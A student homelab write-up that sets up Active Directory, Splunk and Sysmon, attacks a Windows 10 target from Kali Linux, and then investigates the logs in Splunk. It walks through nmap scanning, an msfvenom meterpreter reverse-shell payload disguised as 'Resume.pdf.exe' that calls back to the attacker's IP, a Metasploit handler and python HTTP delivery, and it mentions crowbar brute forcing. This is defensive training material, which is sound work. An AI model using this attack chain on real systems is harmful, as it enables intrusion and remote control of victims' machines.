# 👤🗄 ActiveDirectory (Kali/ART/Splunk) Project

## Objective and Description
In this project, we looked to gain hands on experiance using tools that help us understand and investigate alerts/telemetry. In the SOC homelab with splunk and kali project we observed how a target machine responds to downloading malware and having the attacker perform command and control on it through RDP. We used splunk enterprise to investigate the incident. This project will be similar but the attack method is different and we will be using another tool to help us bridge the gaps in our investigation. We set up an ubuntu server that is runnning splunk enterprise and a Windows 10 target PC with Sysmon, Splunk Forwader, and Atomic Red Team. We also set up a Windows Server 2022 with active directory and uprgrade it to a domain controller with users. Lastly, we set up a attacker Kali Linux machine that uses crowbar to brute force the password of the user on the target machine. All of this will help us learn essential information about attacker techniques and investigating events using splunk, ultimate windows security, Atomic Red Team, and the Mitre ATTACK Framework.

### Skills Learned
- Red Team: How to run and configure Kali Linux and tools within the system
- Blue Team: Configure and deploy Splunk Enterprise with Sysmon feeding it data accompanied with Atomic Red team
- Setup an internal nat network and statically assign IPs so that all hosts can establish connections
- Use commands like ipconfif, ifconfig, ping, and netstat. This helped with checking host IPs, checking whether a host can be pinged, and checking what              connections are established on my machine
- Set up an Active Directory Domain Controller with organizational units and users that have passwords
- Use opens source tool "utlimate windows security" to understand event IDs
- Use the "Crowbar" tool on Kali to  brute force passwords via remote connection
- Use a popular world list in Kali called "Rock You" that gives us common passwords to brute force
- Identify telemtry via Splunk and apply curated searches and investigations to look deep into data

  
  ### Tools Used
- Vitualbox
- Windows 10
- Kali Linux
- Splunk Enterprise
- Sysmon
- Ultimate Windows Security
- Splunk Universal Forwarder
- Windows Server 2022 
- Active Directory Domain Controller
- Ubuntu Server command line
- Powershell
- Windows Command Prompt
- Atomic Red Team

## Steps
- Step 1: We first must construct a diagram of our entire project and how it will be set up and with what tools and applications. In this project, I will not document insatlling and configuring splunk and sysmon because i have done that in another project. Pleace reference the cybersecurity operations center lab.
  
  <img src="https://i.imgur.com/IGBV9hV.png" height="80%" width="80%" alt="Cyber SOC Homelab Steps"/>
- Step 2: On our Windows Server we install Active Directory Domain Services. After that we upgrade into Domain Controller and create our domain. After that we move on to creating "objects" which can be users, groups, computer, etc. We create organizational units to mimic and enterprise environment. These units are segemented in a company usually by department so that users/employees can be placed in the correct unit with their certain privilages. Here we make and Organizational Unit called "IT" and add user a called Jenny Smith with a user login ID of jsmith and also give her a password. We do the same for another OU and user. We make an OU called "HR" and add a user named Terry Smith with a login ID of tsmith and also a password. For this project we will only create two users. After that we, we hop on our target machine to change its domain to the active directory domain called "ahuruse" and restart to ave changes. Then we log in with the Jenny Smith user ID and password that we set up.
  
  <img src="https://i.imgur.com/ntRa1Cv.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/EEMZOOP.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/>
- Step 3: On target Windows machine, we use the "ping" command on the command prompt followed by the IP address of the Kali machine to establish connectivity in the internal network we set up between the two machines. We can't do it the other way around because the Windows firewall rule blocks any incoming connections.
  
  <img src="https://i.imgur.com/ENcKJG1.png" height="80%" width="80%" alt="Cyber SOC Homelab Steps"/> 
- Step 4: On the Kali attacker machine, we run "nmap" against the Windows target machines with the "-A" flag meaning scan all ports and the "Pn" flag meaning to skip pings. After nmap finished its scan on all ports, we see that port 3389 is open which is the port for Remote Desktop Protocol (RDP). This allows for remote connections to your host which is dangerous to have open in any production or enteprise environment.
  
 <img src="https://i.imgur.com/sxsqLmU.png" height="80%" width="80%" alt="Cyber SOC Homelab Steps"/> 

- Step 5: Now its time to create our malware on our attacker Kali Linux machine. We use the "msfvenom" tool to build it. We start of by using a meterpreter reverse shell as our payload. To get a list of payloads; we use the "msfvenom -l payloads" command. We search through the list to find our meterpreter reverse shell payload and copy it to use fo later. Now we can compile the malware. The commad we use is as follows: msfvenom -p (add the copied payload here) lhost= (add the IP address of the attacker machine here) lport= (add the port for the meterpreter here which is 4444) -f (this flag is for the format the file we are creating is in which is exe) -o (this flag is for what you want to name your malware that the target will see; we will name it Resume.pdf.exe).
  
   <img src="https://i.imgur.com/6QlFvXu.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/NrDwruw.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/>
- Step 6: Next, we need open up a handler that will listen to the 4444 port that we configured in our malware. We do this by open up metasploit by typing "msfconsole". We will us the multi handler by typing in "use exploit/multi/handler" and clicking enter. We will be in teh exploit itself. From here we check the options to see what we can configure. We change the what is in the "payload options" from the default payload to the payload that we used for our malware. We also change the "lhost" section to our attacker machine's IP address and make sure all of these changes are saved. After this, we start the handler with the "exploit" command. Now we are listening in and waiting until our target machine executes our malware.
  
  <img src="https://i.imgur.com/NfuX5p9.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/a9EjuJD.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/>

-Step 7: We need to set up an HTTP server on our attacker Kali machine so that our target machine can download our malware. In this case we will use python to this in the same directory as our malware. We type "python3 -m http.server 9999" to create it and now our test machine should be able to access it and download our malware. Now we are done on Kali and must wait for our malware to be executed

<img src="https://i.imgur.com/YFRJXKS.png" height="80%" width="80%" alt="Cyber SOC Homelab Steps"/> 

-Step 8: We hop back on our target Windows 10 machine and disable Windows Defender and anti virus. We head to our kali serviced web page that has the malware on it. We download the malware and run it. Now that the malware has been executed, we open up the command prompt with administrator privilages. We type in "netstat -anob" and we see an established connection to our Kali attacker machine. We also use the PID from that connection output and open it up on windows task manager to see that it is indeed the malware that was executed

<img src="https://i.imgur.com/OKCqc6N.png" height="30%" width="30%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/y4eibW7.png" height="30%" width="30%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/CvvQhNA.png" height="30%" width="30%" alt="Cyber SOC Homelab Steps"/>

-Step 9: Jumping back to our Kali machine, it looks like we have a connection where we were listening in with our handler. Now we have control over the target machine. We now run a few commmands. We type in the "shell" command to establish a shell on our target machine. We also run the "net user", "net localgroup", and "ipconfig" commands to exfiltrate more information from the target machine. After this, we will check back on our Splunk SIEM to see what kind of telemetry has been generated.

<img src="https://i.imgur.com/im8iLwV.png" height="30%" width="30%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/nxwJ7c5.png" height="30%" width="30%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/0AF9kAv.png" height="30%" width="30%" alt="Cyber SOC Homelab Steps"/>


-Step 10: Back on our Splunk SIEM, we search for our "index=endpoint" but at the end of it we query the Kali attacker machine's IP address. It would like this "index=endpoint 192.168.20.11". We scroll down to discover that one destination port was targeted and it was the 3389 port for RDP. Some questions an analyst would ask are; "Should this machine be attempting to connect to RDP?, "What machine is this?", "Who does is belong to?", or "How is it able to listen into and scan my ports?". 

<img src="https://i.imgur.com/UmPMzkS.png" height="80%" width="80%" alt="Cyber SOC Homelab Steps"/>

Step 11: We can further dig deeper into other events that were logged by Splunk. This time we can search with the name of the malware at the end so; "index=endpoint Resume.pdf.exe. We have 13 events and 7 event codes generated. We delve deeper by investigating the first event code out of 7. By expanding this event, we can see that a parent process had spawned another process which ran a cmd.exe. We also see the process id 5428 which we could use to query our data to see what that command had done. Instead we opt with the process guid. We copy the process guid characters and paste it at the end of our "index=enpoint" instead using the malware name or another process id. This would looklike: "index=endpoint d542c381... ". This shows use exactly which commands the attacker used to exfiltrate data displayed in our Splunk.

 <img src="https://i.imgur.com/aP18Q4u.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/> <img src="https://i.imgur.com/W0wafAz.png" height="40%" width="40%" alt="Cyber SOC Homelab Steps"/>



